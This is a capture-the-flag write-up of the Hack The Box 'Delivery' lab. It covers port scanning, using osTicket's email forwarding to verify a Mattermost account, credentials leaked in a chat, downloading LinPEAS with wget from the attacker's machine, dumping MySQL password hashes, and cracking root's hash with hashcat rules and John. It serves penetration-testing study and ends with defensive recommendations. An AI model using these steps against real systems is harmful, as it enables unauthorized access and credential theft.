# Delivery — Hack The Box (CPTS practice)

**Platform:** Hack The Box
**Difficulty:** 🟢 Easy
**OS:** Linux
**Certification:** Extra practice for the CPTS (Certified Penetration Testing Specialist)
**Date completed:** 2026
**Techniques:** Nmap · osTicket (Support Center) · Mattermost · Email verification via a support ticket · Credentials leaked in an internal chat · LinPEAS · Mattermost's `config.json` · MySQL · Hashcat (`best66` rule) + John the Ripper → root
**Language:** English — [🇪🇸 Versión en español](./Delivery_Writeup_ES.md)

---

## Table of contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web enumeration — osTicket and Mattermost](#2-web-enumeration--osticket-and-mattermost)
3. [Initial access — the ticket's email as a Mattermost account](#3-initial-access--the-tickets-email-as-a-mattermost-account)
4. [Getting a shell](#4-getting-a-shell)
5. [Post-exploitation and flags](#5-post-exploitation-and-flags)
6. [Lessons learned](#6-lessons-learned)
7. [Tool & command glossary](#7-tool--command-glossary)

---

## 1. Reconnaissance

```bash
ping -c 1 10.129.69.11
```

> 🛠️ **`ping`** — sends ICMP packets to check whether a host is up and estimate its OS from the TTL. A TTL of **63** (starting from 64) is the classic **Linux** signature.

![](Imagenes/01-ping-ttl-linux.png)

Full TCP port scan:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 10.129.69.11 -oN AllPorts
```

![](Imagenes/02-nmap-todos-los-puertos.png)

Summarized with a personal enumeration tool:

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — a custom script that parses Nmap's output and prints a clean summary (IP, TTL, OS, open ports) ready for the next targeted scan.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

Three open ports: **22** (ssh), **80** (http), and **8065** (non-standard). Version scan:

```bash
nmap -sS -Pn -sCV -T5 -n -p22,80,8065 -oN Ports 10.129.69.11
```

![](Imagenes/04-nmap-version-servicios-ssh-http-mattermost.png)

| Port | Service | Detail |
|------|---------|--------|
| 22 | OpenSSH 7.9p1 (Debian) | — |
| 80 | nginx 1.14.2 | Title "Welcome" |
| 8065 | Golang `net/http` server | **Mattermost**-specific headers |

> 💡 A Go-based HTTP server with those specific headers (`X-Version-Id`, a CSP policy pointing to `cdn.rudderlabs.com`) is the tell-tale signature of **Mattermost**, a self-hosted team chat platform (a Slack alternative).

## 2. Web enumeration — osTicket and Mattermost

The port 80 site links to a **HELPDESK**:

![](Imagenes/05-navegador-delivery-htb-home.png)

```
http://helpdesk.delivery.htb
```

![](Imagenes/06-url-helpdesk-delivery-htb.png)

We add both domains to `/etc/hosts`:

```
10.129.69.11    delivery.htb helpdesk.delivery.htb
```

> 🛠️ **`/etc/hosts`** — Linux's local name-resolution file. Essential whenever a site uses **virtual hosts** (multiple domains on the same IP): without this entry, the browser wouldn't know which IP to resolve the name to.

![](Imagenes/07-etc-hosts-delivery-helpdesk.png)

`helpdesk.delivery.htb` turns out to be an **osTicket** (an open-source support ticket system), and `delivery.htb:8065` is Mattermost's login page:

![](Imagenes/08-osticket-support-center-home.png)
![](Imagenes/09-mattermost-login-page.png)

> 💡 Two seemingly independent applications that end up connected to each other in a non-obvious way.

## 3. Initial access — the ticket's email as a Mattermost account

We open a test ticket:

![](Imagenes/10-osticket-nuevo-ticket-formulario.png)

The system confirms creation with a **ticket number** and an associated email address, formatted as `<ticket_id>@delivery.htb`:

![](Imagenes/11-osticket-ticket-creado-numero.png)

> 🛠️ **Ticket-based email forwarding (osTicket)** — a standard support-ticket feature: any email sent to `<id>@delivery.htb` is automatically appended to that ticket's thread, so the requester can add more info by email without going back to the website. In practice, this address behaves like a **mailbox we ourselves can read**, without controlling any real mail server.

With the ticket number, we can check its status without an account:

![](Imagenes/12-osticket-check-ticket-status.png)
![](Imagenes/13-osticket-view-ticket-thread.png)

On **Mattermost**, we create a new account using that same ticket email address as the sign-up email:

![](Imagenes/14-mattermost-crear-cuenta-email-ticket.png)

Mattermost requires email verification before letting us in:

![](Imagenes/15-mattermost-verificar-email-pendiente.png)

Since the verification email is sent to `<ticket_id>@delivery.htb`, and that address forwards any message into the ticket's thread, **osTicket hands us the verification link directly**, with no need to access any real mail server:

![](Imagenes/16-osticket-ticket-thread-enlace-verificacion.png)

> 💡 This is the box's central vulnerability: a ticket system that forwards email into an "owned" mailbox for the ticket, combined with a second service (Mattermost) that allows signing up with **any** email address without first verifying it belongs to the user, lets you verify an account using an address you don't actually control — all you need is to own the corresponding ticket in the first system. It's a **cross-service trust** flaw, not a technical vulnerability in either service on its own.

Visiting the link verifies the account:

![](Imagenes/17-mattermost-login-email-verified.png)

## 4. Getting a shell

Inside Mattermost, the **Internal** channel holds a conversation between developers where `root` shares server credentials and — without noticing the irony — reveals a reused password pattern:

![](Imagenes/18-mattermost-canal-internal-credencial-mailderiverer.png)

```
@developers Please update theme to the OSTicket before we go live. Credentials to the server are mailderiverer:Youve_G0t_Mail!
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

> 💡 Two leaks in a single message: direct SSH credentials (`mailderiverer:Youve_G0t_Mail!`) and an explicit hint about the team's password pattern (variations of `PleaseSubscribe!`), which comes in handy later for escalating to root.

We connect via SSH:

```bash
ssh mailderiverer@10.129.69.11
```

![](Imagenes/19-ssh-login-mailderiverer.png)

```bash
ls -la
```

![](Imagenes/20-ls-la-home-user-txt.png)

We confirm `user.txt` exists in `mailderiverer`'s home directory.

### Privilege escalation

We serve **LinPEAS** from our attacker machine:

```bash
python3 -m http.server 8080
```

> 🛠️ **LinPEAS** — a script from the PEASS-ng suite that automatically enumerates a Linux system for privilege-escalation vectors (SUID binaries, cron jobs, credentials in config files, misconfigured permissions, and more), color-highlighting the most promising findings.

![](Imagenes/21-python-http-server-linpeas.png)

```bash
wget http://10.10.15.31:8080/linpeas.sh
chmod +x linpeas.sh
```

![](Imagenes/22-wget-linpeas-chmod.png)

```bash
./linpeas.sh -q | tee output.txt
```

> 🛠️ **`-q`** (*quiet*) reduces LinPEAS's visual noise. **`tee`** shows the output on screen in real time **and** simultaneously saves it to a file (`output.txt`), instead of having to choose between watching it or redirecting it.

![](Imagenes/23-linpeas-ejecucion-tee-output.png)

LinPEAS repeatedly flags `/opt/mattermost` as interesting:

```bash
cd /opt/mattermost
ls
```

![](Imagenes/24-cd-opt-mattermost-ls.png)

We check its configuration file:

```bash
cat config/config.json
```

![](Imagenes/25-cat-config-json.png)

The `SqlSettings` section holds the database connection string, with plaintext credentials:

![](Imagenes/26-config-json-sqlsettings-mmuser-password.png)

```
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8..."
```

We connect to MySQL with those credentials:

```bash
mysql -u mmuser -p
```

> 🛠️ **`mysql -u <user> -p`** — MySQL/MariaDB's command-line client; `-p` with no value attached prompts for the password interactively.

![](Imagenes/27-mysql-login-mmuser.png)

```sql
show databases;
use mattermost;
show tables;
```

![](Imagenes/28-mysql-show-databases-tables.png)
![](Imagenes/29-mysql-tables-listado-users.png)

The `Users` table holds password hashes for every Mattermost account:

```sql
select * from Users;
```

![](Imagenes/30-mysql-select-users-hash-root.png)

We locate `root`'s row (`root@delivery.htb`) and copy its bcrypt hash (`$2a$10$...`).

### Cracking root's hash using the chat's hint

```bash
echo 'PleaseSubscribe!' > wordlistbase.txt
```

![](Imagenes/31-wordlistbase-txt-pleasesubscribe.png)

We generate variations of that word by applying a **Hashcat rule** (a set of typical transformations: uppercasing, numeric suffixes, character reversal...), using `hashcat` purely as a **wordlist generator**, with nothing cracked yet:

```bash
hashcat --stdout -r /usr/share/hashcat/rules/best66.rule wordlistbase.txt > wordlist.txt
```

> 🛠️ **`hashcat --stdout -r <rule> <wordlist>`** — without specifying a hash mode (`-m`) or a target hash, Hashcat runs in generator mode: it applies the given rule (`best66.rule`, shipped with Hashcat) to every word in the base wordlist and prints all resulting variants to standard output. This is a **rule-based** dictionary attack technique, far more efficient than random guessing once a pattern is already known.

![](Imagenes/32-hashcat-best66-rule-wordlist.png)

```bash
cat wordlist.txt
```

![](Imagenes/33-cat-wordlist-txt-mutaciones.png)

We save `root`'s hash to a file:

![](Imagenes/34-file-hash-root-bcrypt.png)

And attack it with **John the Ripper** using the freshly generated wordlist:

```bash
john --wordlist=wordlist.txt hash
```

> 🛠️ **`john --wordlist=<file> <hash>`** — runs John the Ripper in dictionary mode: tries every word in the given file against the hash, auto-detecting the hash format (bcrypt `$2a$` here).

![](Imagenes/35-john-wordlist-hash-comando.png)

The password falls:

![](Imagenes/36-john-password-crackeada-pleasesubscribe21.png)

```
PleaseSubscribe!21
```

```bash
su root
whoami
```

![](Imagenes/37-su-root-whoami.png)

`whoami` confirms access as **root**.

## 5. Post-exploitation and flags

With a confirmed root shell, full system compromise is proven.

> 🔒 The exact contents of `user.txt` and `root.txt` aren't published in this writeup on purpose, so anyone practicing this same box still has to complete that last step themselves — the full path to each one is documented in §4 and §5.

## 6. Lessons learned

| Vulnerability | Where | Impact |
|----------------|-------|---------|
| Email-ownership verification relying on a mailbox "borrowed" from another system (an osTicket ticket) | osTicket + Mattermost | Lets an attacker create and verify an account using an email address they don't actually control |
| SSH credentials shared in plaintext in a team chat | Mattermost's Internal channel | Anyone with chat access gets direct server access |
| Database credentials in plaintext in the application's config file | `/opt/mattermost/config/config.json` | Full database access, including every user's password hash |
| A reused password pattern, ironically flagged as "to avoid" right there in the company's own chat | `root`'s password (a `PleaseSubscribe!` variant) | Drastically narrows the search space for a targeted dictionary attack |

## Defensive recommendations

- Never let a ticket system forward email into a mailbox whose contents the ticket's own requester can read, and never use such addresses to verify identity in other services.
- Require genuine proof of email ownership before activating accounts in any service.
- Never share server credentials in chat channels, not even internal ones — use a proper secrets manager.
- Never store database passwords in plaintext in config files the application's own user can read.
- Never reuse predictable password patterns across accounts, and especially never announce the exact pattern in an accessible channel.
- Periodically audit what sensitive information flows through internal communication channels (chats, tickets, emails).

## 7. Tool & command glossary

| Tool / command | What it's for |
|------------------|-----------------|
| `ping` | Check a host is alive and estimate its OS from the TTL |
| `nmap` | Scan a host for open ports, services, and versions |
| `/etc/hosts` | Local name resolution, essential for browsing vhosts in lab environments |
| **osTicket** | Open-source support ticket system; can forward email to a `<ticket>@domain` address |
| **Mattermost** | Self-hosted team chat platform (a Slack alternative) |
| `ssh` | Encrypted remote access client |
| **LinPEAS** | Automated enumeration script for Linux privilege-escalation vectors |
| `tee` | Show output on screen while simultaneously saving it to a file |
| `mysql -u <user> -p` | Command-line client for MySQL/MariaDB |
| `hashcat --stdout -r <rule> <wordlist>` | Generate password variations by applying a Hashcat rule, with no target hash needed |
| `john --wordlist=<file> <hash>` | Dictionary-attack a hash with John the Ripper |

---

*Written by [Arabot](https://github.com/Caan31) · Hack The Box · CPTS practice · 2026*
